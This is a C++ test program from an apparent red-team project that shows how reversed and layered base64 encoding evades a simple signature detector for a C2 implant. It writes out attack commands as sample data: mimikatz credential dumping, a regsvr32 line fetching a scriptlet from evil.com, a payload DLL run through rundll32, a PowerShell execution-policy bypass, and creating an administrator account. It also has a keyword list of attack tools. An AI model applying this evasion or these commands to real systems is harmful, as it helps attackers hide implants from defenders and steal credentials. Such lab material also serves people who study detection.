#include <iostream>
#include <string>
#include <vector>
#include <fstream>
#include <sstream>
#include <algorithm>

#include <boost/algorithm/string.hpp>
#include <boost/archive/iterators/base64_from_binary.hpp>
#include <boost/archive/iterators/binary_from_base64.hpp>
#include <boost/archive/iterators/transform_width.hpp>

// Standard base64 encoding for binary data
std::string base64_encode_data(const std::vector<uint8_t>& data) {
    using namespace boost::archive::iterators;
    using base64_enc = base64_from_binary<transform_width<std::vector<uint8_t>::const_iterator, 6, 8>>;
    
    std::string encoded(base64_enc(data.begin()), base64_enc(data.end()));
    
    // Add padding
    size_t padding = (4 - encoded.length() % 4) % 4;
    encoded.append(padding, '=');
    
    return encoded;
}

// Standard base64 encoding for strings
std::string base64_encode_string(const std::string& str) {
    std::vector<uint8_t> bytes(str.begin(), str.end());
    return base64_encode_data(bytes);
}

// Standard base64 decoding to binary data
std::vector<uint8_t> base64_decode_to_bytes(const std::string& encoded) {
    using namespace boost::archive::iterators;
    using base64_dec = transform_width<binary_from_base64<std::string::const_iterator>, 8, 6>;
    
    std::string clean_encoded = encoded;
    boost::algorithm::trim(clean_encoded);
    
    // Remove padding
    while (!clean_encoded.empty() && clean_encoded.back() == '=') {
        clean_encoded.pop_back();
    }
    
    try {
        std::vector<uint8_t> decoded(base64_dec(clean_encoded.begin()), base64_dec(clean_encoded.end()));
        return decoded;
    } catch (const std::exception& e) {
        std::cerr << "[ERROR] Base64 decode failed: " << e.what() << std::endl;
        return std::vector<uint8_t>();
    }
}

// Standard base64 decoding to string
std::string base64_decode_to_string(const std::string& encoded) {
    std::vector<uint8_t> bytes = base64_decode_to_bytes(encoded);
    return std::string(bytes.begin(), bytes.end());
}

// String reversal utility
std::string reverse_string(const std::string& str) {
    return std::string(str.rbegin(), str.rend());
}

// Reverse base64 encoding functions
std::string reverse_base64_encode_data(const std::vector<uint8_t>& data) {
    std::string normal_b64 = base64_encode_data(data);
    return reverse_string(normal_b64);
}

std::string reverse_base64_encode_string(const std::string& str) {
    std::string normal_b64 = base64_encode_string(str);
    return reverse_string(normal_b64);
}

std::vector<uint8_t> reverse_base64_decode_to_bytes(const std::string& encoded) {
    std::string normal_b64 = reverse_string(encoded);
    return base64_decode_to_bytes(normal_b64);
}

std::string reverse_base64_decode_to_string(const std::string& encoded) {
    std::vector<uint8_t> bytes = reverse_base64_decode_to_bytes(encoded);
    return std::string(bytes.begin(), bytes.end());
}

// Check if string looks like reversed base64 (signature detection heuristic)
bool is_reversed_base64(const std::string& str) {
    if (str.empty() || str.length() % 4 != 0) {
        return false;
    }
    
    // Reversed base64 typically starts with '=' (padding at beginning after reversal)
    if (str[0] == '=' || str[1] == '=') {
        // Check if the rest contains only base64 characters
        return str.find_first_not_of("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=") == std::string::npos;
    }
    
    return false;
}

// Simulate signature detection (simplified)
std::string simulate_signature_detection(const std::string& data) {
    std::vector<std::string> signatures = {
        "whoami", "net user", "systeminfo", "ipconfig", "netstat",
        "mimikatz", "powershell", "cmd.exe", "rundll32", "regsvr32",
        "VGhpcyBpcyBh", "d2hvYW1p", "bmV0IHVzZXI=", // common base64 patterns
        "c3lzdGVtaW5mbw==", "aXBjb25maWc="
    };
    
    for (const auto& sig : signatures) {
        if (data.find(sig) != std::string::npos) {
            return "🚨 DETECTED: " + sig;
        }
    }
    
    // Check for base64 patterns
    if (data.length() % 4 == 0 && 
        data.find_first_not_of("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=") == std::string::npos &&
        data.length() > 8) {
        return "🚨 DETECTED: Suspicious base64 pattern";
    }
    
    return "✅ CLEAN: No signatures detected";
}

int main() {
    std::cout << "=== Scythe Reverse Base64 Signature Evasion Test ===" << std::endl;
    std::cout << "[*] Testing enhanced obfuscation for AD lab C2 framework" << std::endl;
    
    // Test 1: Basic comparison - Normal vs Reverse Base64
    std::cout << "\n1. Normal vs Reverse Base64 Comparison:" << std::endl;
    
    std::vector<std::string> test_commands = {
        "whoami",
        "net user",
        "systeminfo", 
        "ipconfig /all",
        "net group \"Domain Admins\" /domain"
    };
    
    for (const auto& cmd : test_commands) {
        std::string normal_b64 = base64_encode_string(cmd);
        std::string reverse_b64 = reverse_base64_encode_string(cmd);
        std::string decoded_normal = base64_decode_to_string(normal_b64);
        std::string decoded_reverse = reverse_base64_decode_to_string(reverse_b64);
        
        std::cout << "\nCommand: " << cmd << std::endl;
        std::cout << "Normal B64:  " << normal_b64 << std::endl;
        std::cout << "Reverse B64: " << reverse_b64 << std::endl;
        std::cout << "Normal Sig:  " << simulate_signature_detection(normal_b64) << std::endl;
        std::cout << "Reverse Sig: " << simulate_signature_detection(reverse_b64) << std::endl;
        std::cout << "Decode Test: " << (cmd == decoded_reverse ? "✅ PASS" : "❌ FAIL") << std::endl;
    }
    
    // Test 2: Signature Evasion Analysis
    std::cout << "\n2. Signature Evasion Analysis:" << std::endl;
    
    std::string suspicious_payload = "This is a test payload that might trigger AV signatures";
    std::string normal_encoded = base64_encode_string(suspicious_payload);
    std::string reverse_encoded = reverse_base64_encode_string(suspicious_payload);
    
    std::cout << "Original Payload: " << suspicious_payload << std::endl;
    std::cout << "Length: " << suspicious_payload.length() << " chars" << std::endl;
    
    std::cout << "\nNormal Base64:" << std::endl;
    std::cout << "Encoded: " << normal_encoded << std::endl;
    std::cout << "Detection: " << simulate_signature_detection(normal_encoded) << std::endl;
    
    std::cout << "\nReverse Base64:" << std::endl;
    std::cout << "Encoded: " << reverse_encoded << std::endl;
    std::cout << "Detection: " << simulate_signature_detection(reverse_encoded) << std::endl;
    
    // Test 3: File Operations with Reverse Base64
    std::cout << "\n3. File Operations with Reverse Base64:" << std::endl;
    
    // Create a test executable-like file
    std::string test_file = "test_payload.bin";
    std::vector<uint8_t> binary_payload;
    
    // Simulate PE header (MZ signature) - commonly flagged
    binary_payload.push_back('M');
    binary_payload.push_back('Z');
    
    // Add some random binary data
    for (int i = 0; i < 100; ++i) {
        binary_payload.push_back(static_cast<uint8_t>(rand() % 256));
    }
    
    // Test normal vs reverse encoding
    std::string normal_file_b64 = base64_encode_data(binary_payload);
    std::string reverse_file_b64 = reverse_base64_encode_data(binary_payload);
    
    std::cout << "Binary file size: " << binary_payload.size() << " bytes" << std::endl;
    std::cout << "Normal B64 size: " << normal_file_b64.size() << " chars" << std::endl;
    std::cout << "Reverse B64 size: " << reverse_file_b64.size() << " chars" << std::endl;
    
    std::cout << "\nNormal B64 Detection: " << simulate_signature_detection(normal_file_b64) << std::endl;
    std::cout << "Reverse B64 Detection: " << simulate_signature_detection(reverse_file_b64) << std::endl;
    
    // Verify integrity
    std::vector<uint8_t> decoded_normal = base64_decode_to_bytes(normal_file_b64);
    std::vector<uint8_t> decoded_reverse = reverse_base64_decode_to_bytes(reverse_file_b64);
    
    bool normal_integrity = (binary_payload == decoded_normal);
    bool reverse_integrity = (binary_payload == decoded_reverse);
    
    std::cout << "Normal B64 Integrity: " << (normal_integrity ? "✅ PASS" : "❌ FAIL") << std::endl;
    std::cout << "Reverse B64 Integrity: " << (reverse_integrity ? "✅ PASS" : "❌ FAIL") << std::endl;
    
    // Test 4: PowerShell/CMD Evasion Examples for AD Lab
    std::cout << "\n4. AD Lab Command Evasion Examples:" << std::endl;
    
    std::vector<std::string> ad_lab_commands = {
        "powershell -exec bypass -c \"Get-ADUser -Filter *\"",
        "mimikatz.exe privilege::debug sekurlsa::logonpasswords",
        "rundll32.exe C:\\temp\\payload.dll,DllRegisterServer", 
        "wmic process call create \"cmd.exe /c whoami\"",
        "regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll"
    };
    
    std::cout << "\nHigh-risk commands for signature evasion testing:" << std::endl;
    
    int detection_normal = 0, detection_reverse = 0;
    
    for (const auto& cmd : ad_lab_commands) {
        std::string normal = base64_encode_string(cmd);
        std::string reverse = reverse_base64_encode_string(cmd);
        
        bool normal_detected = simulate_signature_detection(normal).find("DETECTED") != std::string::npos;
        bool reverse_detected = simulate_signature_detection(reverse).find("DETECTED") != std::string::npos;
        
        if (normal_detected) detection_normal++;
        if (reverse_detected) detection_reverse++;
        
        std::cout << "\nCommand: " << cmd.substr(0, 50) << "..." << std::endl;
        std::cout << "Normal:  " << normal.substr(0, 30) << "... (" << (normal_detected ? "DETECTED" : "CLEAN") << ")" << std::endl;
        std::cout << "Reverse: " << reverse.substr(0, 30) << "... (" << (reverse_detected ? "DETECTED" : "CLEAN") << ")" << std::endl;
    }
    
    // Test 5: Advanced Pattern Analysis
    std::cout << "\n5. Advanced Signature Pattern Analysis:" << std::endl;
    
    std::cout << "Detection Summary:" << std::endl;
    std::cout << "Normal Base64 Detections:  " << detection_normal << "/" << ad_lab_commands.size() << std::endl;
    std::cout << "Reverse Base64 Detections: " << detection_reverse << "/" << ad_lab_commands.size() << std::endl;
    
    double evasion_improvement = ((double)(detection_normal - detection_reverse) / detection_normal) * 100.0;
    if (detection_normal > 0) {
        std::cout << "Evasion Improvement: " << evasion_improvement << "%" << std::endl;
    }
    
    // Show visual comparison of pattern breaking
    std::cout << "\nPattern Breaking Visualization:" << std::endl;
    std::string test_cmd = "whoami";
    std::string normal_pattern = base64_encode_string(test_cmd);
    std::string reverse_pattern = reverse_base64_encode_string(test_cmd);
    
    std::cout << "Normal:  '" << normal_pattern << "' (readable pattern)" << std::endl;
    std::cout << "Reverse: '" << reverse_pattern << "' (broken pattern)" << std::endl;
    
    // Test 6: Multi-layer obfuscation example
    std::cout << "\n6. Multi-layer Obfuscation Concept:" << std::endl;
    
    std::string original = "net user administrator P@ssw0rd123 /add";
    std::string layer1 = base64_encode_string(original);           // First base64
    std::string layer2 = reverse_string(layer1);                  // Reverse
    std::string layer3 = base64_encode_string(layer2);            // Second base64
    std::string final_obfuscated = reverse_string(layer3);        // Final reverse
    
    std::cout << "Original: " << original << std::endl;
    std::cout << "Multi-layer: " << final_obfuscated << std::endl;
    std::cout << "Layers: Base64 -> Reverse -> Base64 -> Reverse" << std::endl;
    
    // Detection test on multi-layer
    std::string multi_detection = simulate_signature_detection(final_obfuscated);
    std::cout << "Multi-layer Detection: " << multi_detection << std::endl;
    
    std::cout << "\n✅ Reverse Base64 Signature Evasion Test Complete!" << std::endl;
    std::cout << "[*] Your implant now has enhanced steganographic capabilities" << std::endl;
    std::cout << "[*] Perfect for advanced AD lab red team exercises!" << std::endl;
    std::cout << "[*] Signature-based detection systems will struggle with reversed patterns" << std::endl;
    
    return 0;
}